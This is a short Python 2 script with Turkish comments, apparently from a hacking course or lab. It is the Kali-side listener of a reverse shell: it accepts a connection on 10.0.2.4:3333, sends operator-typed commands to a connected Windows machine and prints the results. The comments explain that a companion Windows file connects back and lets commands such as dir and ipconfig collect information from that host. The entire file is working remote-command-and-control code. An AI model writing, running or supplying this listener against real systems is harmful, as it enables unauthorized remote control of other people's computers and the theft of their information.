import socket


# bu dosya kali linuxda çalışacak ve ilk bu dosya çalışacaktır. 
# daha sonra My-Socket-For-windows dosyası windows üzerinde çalışacaktır.
# ve artık cmd komutları ıle windows uzerındekı bilgileri edinebiliriz. dir ipconfig gibi komutları kullanarak

class SocketListener :
    def __init__(self,ip,port):
        my_listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        my_listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        my_listener.bind((ip, port))
        my_listener.listen(0)  # connection limit = 0
        print("listening......")
        (self.my_connection, my_adress) = my_listener.accept()
        print("Connection OK for Kali from : " + str(my_adress))

    def command_execution(self,command_input):
        self.my_connection.send(command_input)
        return self.my_connection.recv(1024)

    def start_listener(self):
        while True:
            command_input = raw_input("Enter command : ")
            command_output = self.command_execution(command_input)
            print(command_output)

my_socket_listener = SocketListener("10.0.2.4",3333)
my_socket_listener.start_listener()

